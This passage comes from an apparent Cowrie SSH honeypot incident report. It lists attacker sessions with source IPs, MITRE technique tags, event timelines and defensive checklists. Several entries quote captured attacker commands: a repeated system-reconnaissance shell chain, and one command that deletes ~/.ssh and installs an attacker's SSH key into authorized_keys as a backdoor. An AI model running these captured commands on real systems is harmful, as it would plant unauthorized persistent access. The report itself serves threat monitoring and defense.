| `2026-07-21 19:42:30` | `cowrie.command.input` |
| `2026-07-21 19:42:30` | `cowrie.command.success` |
| `2026-07-21 19:42:30` | `cowrie.command.input` |
| `2026-07-21 19:42:30` | `cowrie.command.input` |
| `2026-07-21 19:42:30` | `cowrie.command.input` |
| `2026-07-21 19:42:30` | `cowrie.command.input` |
| `2026-07-21 19:42:31` | `cowrie.log.closed` |
| `2026-07-21 19:42:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ae8aed9b4eb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:45 |
| **Last Seen** | 2026-07-21 19:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:45:53` | `cowrie.session.connect` |
| `2026-07-21 19:45:53` | `cowrie.client.version` |
| `2026-07-21 19:45:53` | `cowrie.client.kex` |
| `2026-07-21 19:45:55` | `cowrie.login.success` |
| `2026-07-21 19:45:57` | `cowrie.session.params` |
| `2026-07-21 19:45:57` | `cowrie.command.input` |
| `2026-07-21 19:45:57` | `cowrie.command.input` |
| `2026-07-21 19:45:57` | `cowrie.command.input` |
| `2026-07-21 19:45:57` | `cowrie.command.input` |
| `2026-07-21 19:45:57` | `cowrie.command.input` |
| `2026-07-21 19:45:57` | `cowrie.command.success` |
| `2026-07-21 19:45:57` | `cowrie.command.input` |
| `2026-07-21 19:45:57` | `cowrie.command.input` |
| `2026-07-21 19:45:57` | `cowrie.command.input` |
| `2026-07-21 19:45:57` | `cowrie.command.input` |
| `2026-07-21 19:45:57` | `cowrie.log.closed` |
| `2026-07-21 19:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2776295f1075

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:47 |
| **Last Seen** | 2026-07-21 19:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:47:41` | `cowrie.session.connect` |
| `2026-07-21 19:47:41` | `cowrie.client.version` |
| `2026-07-21 19:47:41` | `cowrie.client.kex` |
| `2026-07-21 19:47:43` | `cowrie.login.success` |
| `2026-07-21 19:47:45` | `cowrie.session.params` |
| `2026-07-21 19:47:45` | `cowrie.command.input` |
| `2026-07-21 19:47:45` | `cowrie.command.input` |
| `2026-07-21 19:47:45` | `cowrie.command.input` |
| `2026-07-21 19:47:45` | `cowrie.command.input` |
| `2026-07-21 19:47:45` | `cowrie.command.input` |
| `2026-07-21 19:47:45` | `cowrie.command.success` |
| `2026-07-21 19:47:45` | `cowrie.command.input` |
| `2026-07-21 19:47:45` | `cowrie.command.input` |
| `2026-07-21 19:47:45` | `cowrie.command.input` |
| `2026-07-21 19:47:45` | `cowrie.command.input` |
| `2026-07-21 19:47:45` | `cowrie.log.closed` |
| `2026-07-21 19:47:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8af3b7c885aa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:49 |
| **Last Seen** | 2026-07-21 19:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:49:19` | `cowrie.session.connect` |
| `2026-07-21 19:49:20` | `cowrie.client.version` |
| `2026-07-21 19:49:20` | `cowrie.client.kex` |
| `2026-07-21 19:49:21` | `cowrie.login.success` |
| `2026-07-21 19:49:23` | `cowrie.session.params` |
| `2026-07-21 19:49:23` | `cowrie.command.input` |
| `2026-07-21 19:49:23` | `cowrie.command.input` |
| `2026-07-21 19:49:23` | `cowrie.command.input` |
| `2026-07-21 19:49:23` | `cowrie.command.input` |
| `2026-07-21 19:49:23` | `cowrie.command.input` |
| `2026-07-21 19:49:23` | `cowrie.command.success` |
| `2026-07-21 19:49:23` | `cowrie.command.input` |
| `2026-07-21 19:49:23` | `cowrie.command.input` |
| `2026-07-21 19:49:23` | `cowrie.command.input` |
| `2026-07-21 19:49:23` | `cowrie.command.input` |
| `2026-07-21 19:49:23` | `cowrie.log.closed` |
| `2026-07-21 19:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c6fb20c1079

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:50 |
| **Last Seen** | 2026-07-21 19:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:50:54` | `cowrie.session.connect` |
| `2026-07-21 19:50:54` | `cowrie.client.version` |
| `2026-07-21 19:50:54` | `cowrie.client.kex` |
| `2026-07-21 19:50:56` | `cowrie.login.success` |
| `2026-07-21 19:50:57` | `cowrie.session.params` |
| `2026-07-21 19:50:57` | `cowrie.command.input` |
| `2026-07-21 19:50:57` | `cowrie.command.input` |
| `2026-07-21 19:50:57` | `cowrie.command.input` |
| `2026-07-21 19:50:57` | `cowrie.command.input` |
| `2026-07-21 19:50:57` | `cowrie.command.input` |
| `2026-07-21 19:50:57` | `cowrie.command.success` |
| `2026-07-21 19:50:57` | `cowrie.command.input` |
| `2026-07-21 19:50:57` | `cowrie.command.input` |
| `2026-07-21 19:50:57` | `cowrie.command.input` |
| `2026-07-21 19:50:57` | `cowrie.command.input` |
| `2026-07-21 19:50:57` | `cowrie.log.closed` |
| `2026-07-21 19:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1136e90922e8

| Field | Detail |
|---|---|
| **Source IP** | `61.145.163[.]164` |
| **First Seen** | 2026-07-21 19:52 |
| **Last Seen** | 2026-07-21 19:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:52:06` | `cowrie.session.connect` |
| `2026-07-21 19:52:06` | `cowrie.client.version` |
| `2026-07-21 19:52:06` | `cowrie.client.kex` |
| `2026-07-21 19:52:08` | `cowrie.login.success` |
| `2026-07-21 19:52:09` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:52:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.163[.]164` to AbuseIPDB if not already reported
- [ ] Block `61.145.163[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a7ce0b50774

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:52 |
| **Last Seen** | 2026-07-21 19:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:52:28` | `cowrie.session.connect` |
| `2026-07-21 19:52:29` | `cowrie.client.version` |
| `2026-07-21 19:52:29` | `cowrie.client.kex` |
| `2026-07-21 19:52:30` | `cowrie.login.success` |
| `2026-07-21 19:52:32` | `cowrie.session.params` |
| `2026-07-21 19:52:32` | `cowrie.command.input` |
| `2026-07-21 19:52:32` | `cowrie.command.input` |
| `2026-07-21 19:52:32` | `cowrie.command.input` |
| `2026-07-21 19:52:32` | `cowrie.command.input` |
| `2026-07-21 19:52:32` | `cowrie.command.input` |
| `2026-07-21 19:52:32` | `cowrie.command.success` |
| `2026-07-21 19:52:32` | `cowrie.command.input` |
| `2026-07-21 19:52:32` | `cowrie.command.input` |
| `2026-07-21 19:52:32` | `cowrie.command.input` |
| `2026-07-21 19:52:32` | `cowrie.command.input` |
| `2026-07-21 19:52:32` | `cowrie.log.closed` |
| `2026-07-21 19:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-793af0bbeace

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:54 |
| **Last Seen** | 2026-07-21 19:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:54:02` | `cowrie.session.connect` |
| `2026-07-21 19:54:02` | `cowrie.client.version` |
| `2026-07-21 19:54:02` | `cowrie.client.kex` |
| `2026-07-21 19:54:04` | `cowrie.login.success` |
| `2026-07-21 19:54:05` | `cowrie.session.params` |
| `2026-07-21 19:54:05` | `cowrie.command.input` |
| `2026-07-21 19:54:05` | `cowrie.command.input` |
| `2026-07-21 19:54:05` | `cowrie.command.input` |
| `2026-07-21 19:54:05` | `cowrie.command.input` |
| `2026-07-21 19:54:05` | `cowrie.command.input` |
| `2026-07-21 19:54:05` | `cowrie.command.success` |
| `2026-07-21 19:54:05` | `cowrie.command.input` |
| `2026-07-21 19:54:05` | `cowrie.command.input` |
| `2026-07-21 19:54:05` | `cowrie.command.input` |
| `2026-07-21 19:54:05` | `cowrie.command.input` |
| `2026-07-21 19:54:06` | `cowrie.log.closed` |
| `2026-07-21 19:54:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09692a175742

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:55 |
| **Last Seen** | 2026-07-21 19:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:55:44` | `cowrie.session.connect` |
| `2026-07-21 19:55:44` | `cowrie.client.version` |
| `2026-07-21 19:55:44` | `cowrie.client.kex` |
| `2026-07-21 19:55:46` | `cowrie.login.success` |
| `2026-07-21 19:55:47` | `cowrie.session.params` |
| `2026-07-21 19:55:47` | `cowrie.command.input` |
| `2026-07-21 19:55:47` | `cowrie.command.input` |
| `2026-07-21 19:55:47` | `cowrie.command.input` |
| `2026-07-21 19:55:47` | `cowrie.command.input` |
| `2026-07-21 19:55:47` | `cowrie.command.input` |
| `2026-07-21 19:55:47` | `cowrie.command.success` |
| `2026-07-21 19:55:47` | `cowrie.command.input` |
| `2026-07-21 19:55:47` | `cowrie.command.input` |
| `2026-07-21 19:55:47` | `cowrie.command.input` |
| `2026-07-21 19:55:47` | `cowrie.command.input` |
| `2026-07-21 19:55:47` | `cowrie.log.closed` |
| `2026-07-21 19:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8ffd4278c77

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:57 |
| **Last Seen** | 2026-07-21 19:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:57:29` | `cowrie.session.connect` |
| `2026-07-21 19:57:29` | `cowrie.client.version` |
| `2026-07-21 19:57:29` | `cowrie.client.kex` |
| `2026-07-21 19:57:30` | `cowrie.login.success` |
| `2026-07-21 19:57:32` | `cowrie.session.params` |
| `2026-07-21 19:57:32` | `cowrie.command.input` |
| `2026-07-21 19:57:32` | `cowrie.command.input` |
| `2026-07-21 19:57:32` | `cowrie.command.input` |
| `2026-07-21 19:57:32` | `cowrie.command.input` |
| `2026-07-21 19:57:32` | `cowrie.command.input` |
| `2026-07-21 19:57:32` | `cowrie.command.success` |
| `2026-07-21 19:57:32` | `cowrie.command.input` |
| `2026-07-21 19:57:32` | `cowrie.command.input` |
| `2026-07-21 19:57:32` | `cowrie.command.input` |
| `2026-07-21 19:57:32` | `cowrie.command.input` |
| `2026-07-21 19:57:32` | `cowrie.log.closed` |
| `2026-07-21 19:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f93970d2b894

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 19:58 |
| **Last Seen** | 2026-07-21 19:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:58:02` | `cowrie.session.connect` |
| `2026-07-21 19:58:02` | `cowrie.client.version` |
| `2026-07-21 19:58:02` | `cowrie.client.kex` |
| `2026-07-21 19:58:02` | `cowrie.login.success` |
| `2026-07-21 19:58:03` | `cowrie.session.params` |
| `2026-07-21 19:58:03` | `cowrie.command.input` |
| `2026-07-21 19:58:03` | `cowrie.log.closed` |
| `2026-07-21 19:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16efcddedc0e

| Field | Detail |
|---|---|
| **Source IP** | `168.144.102[.]169` |
| **First Seen** | 2026-07-21 19:58 |
| **Last Seen** | 2026-07-21 19:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:58:19` | `cowrie.session.connect` |
| `2026-07-21 19:58:19` | `cowrie.client.version` |
| `2026-07-21 19:58:19` | `cowrie.client.kex` |
| `2026-07-21 19:58:20` | `cowrie.login.success` |
| `2026-07-21 19:58:21` | `cowrie.session.params` |
| `2026-07-21 19:58:21` | `cowrie.command.input` |
| `2026-07-21 19:58:21` | `cowrie.command.failed` |
| `2026-07-21 19:58:22` | `cowrie.log.closed` |
| `2026-07-21 19:58:23` | `cowrie.session.params` |
| `2026-07-21 19:58:23` | `cowrie.command.input` |
| `2026-07-21 19:58:23` | `cowrie.session.file_download` |
| `2026-07-21 19:58:23` | `cowrie.log.closed` |
| `2026-07-21 19:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.144.102[.]169` to AbuseIPDB if not already reported
- [ ] Block `168.144.102[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f1916071854

| Field | Detail |
|---|---|
| **Source IP** | `168.144.102[.]169` |
| **First Seen** | 2026-07-21 19:58 |
| **Last Seen** | 2026-07-21 19:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:58:23` | `cowrie.session.connect` |
| `2026-07-21 19:58:23` | `cowrie.client.version` |
| `2026-07-21 19:58:24` | `cowrie.client.kex` |
| `2026-07-21 19:58:25` | `cowrie.login.success` |
| `2026-07-21 19:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.144.102[.]169` to AbuseIPDB if not already reported
- [ ] Block `168.144.102[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e20442dca7dc

| Field | Detail |
|---|---|
| **Source IP** | `168.144.102[.]169` |
| **First Seen** | 2026-07-21 19:58 |
| **Last Seen** | 2026-07-21 19:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:58:25` | `cowrie.session.connect` |
| `2026-07-21 19:58:25` | `cowrie.client.version` |
| `2026-07-21 19:58:25` | `cowrie.client.kex` |
| `2026-07-21 19:58:26` | `cowrie.login.success` |
| `2026-07-21 19:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.144.102[.]169` to AbuseIPDB if not already reported
- [ ] Block `168.144.102[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e683febb2b8c

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-07-21 19:58 |
| **Last Seen** | 2026-07-21 19:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:58:26` | `cowrie.session.connect` |
| `2026-07-21 19:58:27` | `cowrie.client.version` |
| `2026-07-21 19:58:27` | `cowrie.client.kex` |
| `2026-07-21 19:58:29` | `cowrie.login.success` |
| `2026-07-21 19:58:30` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:58:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6d5632a946b

| Field | Detail |
|---|---|
| **Source IP** | `65.20.233[.]110` |
| **First Seen** | 2026-07-21 19:58 |
| **Last Seen** | 2026-07-21 19:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:58:39` | `cowrie.session.connect` |
| `2026-07-21 19:58:40` | `cowrie.client.version` |
| `2026-07-21 19:58:40` | `cowrie.client.kex` |
| `2026-07-21 19:58:42` | `cowrie.login.success` |
| `2026-07-21 19:58:42` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.233[.]110` to AbuseIPDB if not already reported
- [ ] Block `65.20.233[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f418d2672812

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:59 |
| **Last Seen** | 2026-07-21 19:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
